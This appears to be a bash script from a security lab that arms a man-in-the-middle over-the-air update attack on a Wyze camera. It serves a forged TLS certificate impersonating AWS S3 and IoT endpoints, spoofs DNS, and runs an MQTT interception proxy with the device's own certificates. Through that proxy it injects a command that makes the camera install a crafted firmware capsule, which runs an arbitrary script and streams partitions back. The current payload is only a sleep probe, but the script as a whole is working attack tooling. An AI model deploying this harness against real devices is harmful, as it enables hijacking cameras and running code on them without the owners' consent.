#!/bin/bash
# Arm the LAN OTA harness for one camera and keep it armed.
#
#   forged TLS :443  (eMudhra leaf, SANs cover aws-iot / *.iot.us-west-2 / S3 / upgrade-service)
#   capsule    :<CAP_DIR>/<CAP_PATH>, built here if absent
#   MQTT proxy :8883 (transparent to the real AWS with the device's own certs; injects the
#                     shadow delta and cmd 1234 into a live session)
#
# DNS + ARP are bettercap's job (com.jeffreyemanuel.wyze-spoof). This script only owns the two
# listeners, so it is safe to run under launchd KeepAlive: every start clears stale copies first.
#
#   CAM=192.168.4.23 MAC=80482c525905 ./wyze_ota_arm.sh
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
PY=/opt/homebrew/bin/python3

CAM="${CAM:-192.168.4.23}"
MAC="${MAC:-80482c525905}"
UP="${UP:-192.168.4.160}"
CAP_DIR="${CAP_DIR:-/tmp/fwserve}"
CAP_PATH="${CAP_PATH:-wuv2/upgrade/HL_CAM4/firmware/4.52.17.33.tar}"
PROBE="${PROBE:-/tmp/probe.sh}"

# 1. capsule (zero-write dispatch probe: platform_upgrade never checks the exit status, so a
#    2-minute extra uptime proves the script ran)
if [ ! -s "$CAP_DIR/$CAP_PATH" ]; then
  mkdir -p "$(dirname "$CAP_DIR/$CAP_PATH")"
  [ -s "$PROBE" ] || printf '#!/bin/sh\nsleep 120\n' > "$PROBE"
  "$PY" "$HERE/build_ota_tar.py" --script "$PROBE" --out-dir /tmp/cap_probe --no-aes >/dev/null
  cp /tmp/cap_probe/Upgrade.tar "$CAP_DIR/$CAP_PATH"
fi
# the device's own IoT material, served from the same forged host so the cloud API can hand out
# URLs that resolve here (get_iot_certificate -> /fss/{rootCA.crt,cert.pem,privkey.pem})
# The device's own IoT material. The repo copy is authoritative: ~/.config is not versioned and
# vanished once, which cost an hour of registration loops and silent upstream failures.
MAC_U=$(echo "$MAC" | tr a-f A-F)
REPO_CERTS="$HERE/../certs/iot/$MAC_U"
HOME_CERTS="/Users/jemanuel/.config/fss-lab/wyze_iot/$MAC_U"
if [ -s "$REPO_CERTS/cert.pem" ] && [ -s "$REPO_CERTS/privkey.pem" ] && [ -s "$REPO_CERTS/rootCA.crt" ]; then
  CERTDIR="$REPO_CERTS"
elif [ -s "$HOME_CERTS/cert.pem" ] && [ -s "$HOME_CERTS/privkey.pem" ] && [ -s "$HOME_CERTS/rootCA.crt" ]; then
  CERTDIR="$HOME_CERTS"
  echo "warn: using $HOME_CERTS; copy it to $REPO_CERTS so it survives" >&2
else
  # without this the proxy dies with FileNotFoundError on every session and the device just loops
  # on registration, which looks exactly like a device fault
  echo "FATAL: no complete device cert set for $MAC_U in $REPO_CERTS or $HOME_CERTS" >&2
  exit 1
fi
mkdir -p "$CAP_DIR/fss"
for f in rootCA.crt cert.pem privkey.pem; do
  cp "$CERTDIR/$f" "$CAP_DIR/fss/$f"
done
# The handler advertises PROC_VER and builds the download path from it, so the mirrored bytes must
# exist under that version too or every download 404s (81 of them, once).
SRC="$CAP_DIR/wyzeedgeai_cam_v4_test_protocol/14.9.50039.r"
DST="$CAP_DIR/wyzeedgeai_cam_v4_test_protocol/${PROC_VER:-14.9.50040.r}"
if [ -d "$SRC" ] && [ "$SRC" != "$DST" ]; then
  mkdir -p "$DST"
  for f in "$SRC"/*; do [ -e "$DST/$(basename "$f")" ] || cp "$f" "$DST/"; done
fi

# the kvs process is advertised with the same version string, so its dir needs the same treatment
KSRC="$CAP_DIR/kvsWebrtcClientMaster_t41/2.1.2.573"
KDST="$CAP_DIR/kvsWebrtcClientMaster_t41/${PROC_VER:-14.9.50040.r}"
if [ -d "$KSRC" ] && [ "$KSRC" != "$KDST" ]; then
  mkdir -p "$KDST"
  for f in "$KSRC"/*; do [ -e "$KDST/$(basename "$f")" ] || cp "$f" "$KDST/"; done
fi

MD5=$(md5 -q "$CAP_DIR/$CAP_PATH")
URL="https://s3-us-west-2.amazonaws.com/$CAP_PATH"

# 2. stale listeners shadow new runs silently (EADDRINUSE)
for port in 443 8883; do
  pids=$(lsof -nP -tiTCP:"$port" -sTCP:LISTEN 2>/dev/null)
  [ -n "$pids" ] && kill $pids 2>/dev/null
  # a launchd respawn can race the previous run's listener; wait for the port, bounded
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    lsof -nP -tiTCP:"$port" -sTCP:LISTEN >/dev/null 2>&1 || break
    sleep 0.3
  done
done

# 3. forged TLS. The forge rewrites certs/emudhra/serve.pem on start, so hand the proxy its own
#    copy built here — loading the file the forge is truncating gives "PEM lib".
mkdir -p /tmp/ota
# newline-separated: a PEM without a trailing newline glues the next header on and OpenSSL
# answers "PEM: BAD_END_LINE"
{ cat "$HERE/../certs/emudhra/leaf.pem"; echo; cat "$HERE/../certs/emudhra/ev-ca-aaa-cross.pem"; \
  echo; cat "$HERE/../certs/emudhra/leaf.key"; } > /tmp/ota/chain.pem
"$PY" "$HERE/wyze_dns_redirect.py" "$UP" "${GW:-192.168.4.1}" >>/tmp/dns.log 2>&1 &
"$PY" "$HERE/wyze_forge_serve.py" --dir "$CAP_DIR" --port 443 \
  --sni s3-us-west-2.amazonaws.com >>/tmp/ota/forge.log 2>&1 &
# the capsule streams every partition back before it writes; without a receiver it dies at step 2
"$PY" "$HERE/wyze_backup_recv.py" --base-port "${PORT:-8446}" --dir /tmp/fwbackup \
  >>/tmp/ota/backup.log 2>&1 &
FORGE=$!
sleep 1

echo "armed: $URL md5=$MD5 cam=$CAM mac=$MAC" >>/tmp/ota/arm.log

# 4. proxy in the foreground so launchd supervises it; the forge is reaped by the trap
trap 'kill $FORGE 2>/dev/null' EXIT
export THING="$MAC" D="$CERTDIR"
export CHAIN=/tmp/ota/chain.pem INJECT=1 OTA_URL="$URL" OTA_MD5="$MD5"
exec "$PY" "$HERE/wyze_mqtt_mitm.py"
